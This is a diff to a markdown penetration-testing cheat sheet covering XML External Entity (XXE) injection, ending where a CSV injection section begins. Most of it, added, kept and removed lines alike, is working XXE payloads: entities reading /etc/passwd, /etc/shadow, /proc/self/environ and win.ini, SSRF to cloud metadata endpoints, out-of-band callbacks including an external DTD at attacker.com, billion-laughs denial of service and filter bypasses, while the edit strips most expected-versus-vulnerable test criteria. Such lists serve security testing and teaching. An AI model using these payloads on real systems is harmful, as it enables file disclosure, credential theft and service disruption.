@@ -3535,61 +3535,47 @@ http://10.10.10.10/cat/accountsid=1
 
 ## 🧬 XML External Entity (XXE) Injection Test Suite
 
+# 🔹 Basic XML Injection
+
+Tag Injection : `<user>admin</user>` → Inject new XML node  
+Break Structure : `</user><admin>true</admin>` → Modify XML hierarchy  
+Attribute Injection : `<user name="admin">` → Override attributes
+
 ### 1. Basic External Entity Injection  
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<user>&xxe;</user>
+<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+<user>&xxe;</user>
+Linux File Read : `SYSTEM "file:///etc/passwd"` → Sensitive file access  
+Config File Read : `SYSTEM "file:///var/www/config.xml"` → Application secrets  
+Env File Read : `SYSTEM "file:///proc/self/environ"` → Environment variables
 ```
-
-✅ Expected: External entities disabled  
-❌ Vulnerable: File contents returned
-
----
 
 ### 2. Blind XXE via Out-of-Band DNS  
 ```xml
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://yourdomain.burpcollaborator.net"> %xxe; ]>
 <stockCheck><productId>123</productId></stockCheck>
 ```
-
-✅ Expected: No DNS resolution  
-❌ Vulnerable: DNS ping received
-
----
-
 ### 3. SSRF via Metadata Service  
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
-
-✅ Expected: Internal IPs blocked  
-❌ Vulnerable: Metadata returned
-
----
-
 ### 4. Base64 File Read via PHP Filter  
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
 <data>&xxe;</data>
 ```
-
-✅ Expected: Filter blocked  
-❌ Vulnerable: Encoded file contents returned
-
----
-
 ### 5. Parameter Entity for Blind XXE  
 ```xml
 <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://yourdomain.com"> %xxe; ]>
 <stockCheck><productId>3</productId></stockCheck>
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+<stockCheck><productId>3</productId></stockCheck>
 ```
-
-✅ Expected: Parameter entities disabled  
-❌ Vulnerable: OOB interaction triggered
-
----
-
 ### 6. Billion Laughs DoS  
 ```xml
 <!DOCTYPE lolz [
@@ -3600,78 +3586,8 @@ http://10.10.10.10/cat/accountsid=1
 ]>
 <data>&a3;</data>
 ```
-
-✅ Expected: Entity expansion limits enforced  
-❌ Vulnerable: Parser crash or hang
-
----
-
-### 7. XInclude Injection  
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-```
-
-✅ Expected: XInclude disabled  
-❌ Vulnerable: File contents included
-
----
-
-### 8. Directory Listing via Entity  
-```xml
-<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/"> ]>
-<root><foo>&xxe;</foo></root>
-```
-
-✅ Expected: Directory access blocked  
-❌ Vulnerable: Directory contents listed
-
----
-
-### 9. XXE Inside DOCX/SVG  
-Embed payloads in file formats that use XML internally.
-
-✅ Expected: Secure parsing of embedded XML  
-❌ Vulnerable: XXE triggered via file upload
-
-# **1. List of Vulnerabilities (XXE Attack Surface)**
-
 * **1.1 Classic External Entity Injection**
   Loading external files via `<!ENTITY>`.
-
-* **1.2 File Disclosure via XXE**
-  Reading sensitive files such as `/etc/passwd`.
-
-* **1.3 SSRF via XXE**
-  Using XML parsers to send requests to internal services.
-
-* **1.4 Blind XXE (Out-of-Band)**
-  Exfiltrating data using DNS/HTTP callbacks.
-
-* **1.5 Parameter Entity Expansion**
-  Parser loads external entities inside attributes.
-
-* **1.6 Billion Laughs (DoS)**
-  Recursive entities causing memory exhaustion.
-
-* **1.7 Schema / DTD Injection**
-  Attacker injects malicious internal DTD references.
-
-* **1.8 External DTD Fetching Bypass**
-  With custom URIs, multi-encoding, or specially crafted payloads.
-
-* **1.9 SVG, SOAP, DOCX, PDF XXE**
-  XXE through XML-based file formats.
-
-* **1.10 XXE → RCE (rare, chained)**
-  When XML parser interacts with command-executing libraries.
-
----
-
-# **2. Sample Payloads (Core Attack Payloads)**
-
-(Simple, safe-to-read examples)
 
 ### **2.1 Basic XXE – File Read**
 
@@ -3710,45 +3626,6 @@ Embed payloads in file formats that use XML internally.
 ]>
 <data>&c;</data>
 ```
-
----
-
-# **3. Bypass Payloads (Advanced Techniques)**
-
-Used when the application blocks DTD or external entities.
-
-### **3.1 Base64 Encoded File Read**
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-  <!ENTITY xxe "%data;">
-]>
-<root>&xxe;</root>
-```
-
-### **3.2 Parameter Entity Bypass**
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
-  <!ENTITY p2 "%p1;">
-]>
-<root>%p2;</root>
-```
-
-### **3.3 XXE in SOAP Envelope**
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE a [
-  <!ENTITY xxe SYSTEM "file:///etc/shadow">
-]>
-<soap:Envelope>
-  <data>&xxe;</data>
-</soap:Envelope>
-```
-
 ### **3.4 External DTD Bypass**
 
 Hosted malicious DTD:
@@ -3772,190 +3649,6 @@ Hosted malicious DTD:
   <!ENTITY %25xxe SYSTEM "file:///etc/passwd">
 ]>
 ```
-
-### **3.6 Numeric IP SSRF**
-
-```
-http://2130706433        (127.0.0.1 in decimal)
-```
-
-### **3.7 SVG File XXE**
-
-```xml
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg>&xxe;</svg>
-```
-
----
-
-# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
-
-### **4.1 Real File Disclosure Payload**
-
-```xml
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM "/etc/hostname">
-]>
-<root>&xxe;</root>
-```
-
-### **4.2 AWS Metadata Access**
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
-]>
-<root>&xxe;</root>
-```
-
-### **4.3 GitHub Enterprise (SSRF)**
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://localhost:8080/api/v3/admin">
-]>
-<data>&xxe;</data>
-```
-
-### **4.4 Blind XXE with Burp Collaborator**
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://x.your-collab.net">
-]>
-<ping>&xxe;</ping>
-```
-
-### **4.5 DOCX / PPTX XXE (word/document.xml)**
-
-```xml
-<!DOCTYPE r [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<w:p>&xxe;</w:p>
-```
-
-### **4.6 PDF XXE (XMP Section)**
-
-```xml
-<!DOCTYPE x [
-  <!ENTITY xxe SYSTEM "file:///etc/hosts">
-]>
-<metadata>&xxe;</metadata>
-```
-
----
-
-# **5. Validation / Test Steps**
-
-**Step 1:** Identify any XML-processing endpoint
-→ SOAP, SAML, SVG upload, RSS feeds, XML APIs, PDF/DOCX processors.
-
-**Step 2:** Send basic XXE — check for file content.
-→ `/etc/passwd`, `/etc/hostname`.
-
-**Step 3:** Attempt SSRF XXE
-→ `127.0.0.1`, `169.254.169.254`.
-
-**Step 4:** Try blind XXE / OOB
-→ DNS/HTTP callbacks.
-
-**Step 5:** Try bypass payloads
-→ parameter entities, encoded DTD, external DTD hosting.
-
----
-
-# **6. Expected Results / Impact**
-
-* Sensitive file disclosure.
-* SSRF into internal systems.
-* Cloud metadata credentials leakage.
-* Application crash due to DoS.
-* Potential **RCE** when chained with unsafe parsers or libraries.
----
-
-### 10. Content-Type Mismatch  
-Send XML with incorrect `Content-Type`.
-
-```http
-POST /api/xml
-Content-Type: application/json
-
-<?xml version="1.0"?><foo>&xxe;</foo>
-```
-
-✅ Expected: Parser rejects mismatched content  
-❌ Vulnerable: XML parsed despite header
-
-To systematically identify and fuzz **XXE injection points**, it's crucial to understand both **where** and **how** XML content is handled across the application. Here's a structured breakdown of **common parameters** and **fuzzing criteria** tailored for XXE hunting:
-
----
-
-## 🧩 Common Parameters to Fuzz (One-Liner Format)
-
-> xml, request, data, body, content, payload, input, message, soap, envelope, file, filepath, filename, doc, document, resource, template, config, metadata, settings, schema, definition, DTD, markup, parser, render, type, feed, submission, upload, import, include, attachment
-
-## 🧪 Fuzzing Criteria for XXE Vulnerability
-
-Each parameter should be tested under one or more of the following conditions:
-
-### 📦 **1. Payload Accepted in XML Format**
-- Does the parameter support or accept XML-formatted input?
-- Try submitting:
-  ```xml
-  <root>&test;</root>
-  ```
-  and observe parsing behavior.
-
----
-
-### 📥 **2. External Entities Are Parsed**
-- Inject `<!DOCTYPE>` declaration with `SYSTEM`, `PUBLIC`, or `ENTITY` tags.
-- Validate via file read (`file:///etc/passwd`) or SSRF (`http://domain/xxe`).
-
----
-
-### 🌐 **3. Out-of-Band (Blind XXE) Behavior**
-- Monitor for DNS/HTTP callbacks triggered by payload like:
-  ```xml
-  <!ENTITY xxe SYSTEM "http://collaborator.net/ping">
-  ```
-
----
-
-### 🧾 **4. Content-Type Enforcement**
-- Send XML payload with various content types:
-  - `application/xml`
-  - `text/xml`
-  - `application/json` (to test mismatch parsing)
-
----
-
-### 📎 **5. Embedded File References**
-- Check if parameters accept paths or file references.
-  - Example: `file`, `template`, `doc`, `import`
-- Try entities like:
-  ```xml
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-  ```
-
----
-
-### 🔗 **6. Header-Based Reflection**
-- Inspect headers:
-  - `SOAPAction`, `X-XML-Content`, `Content-Disposition`
-- Inject malformed XML via POST body or headers.
-
----
-
-### 🎯 **7. Format-Specific XML Parsing**
-- Submit XML inside structured formats like DOCX, SVG, or XSL.
-- Upload files with embedded XXE payloads.
-
----
-
 # CSV Injection (Formula Injection)
 
 ## Overview
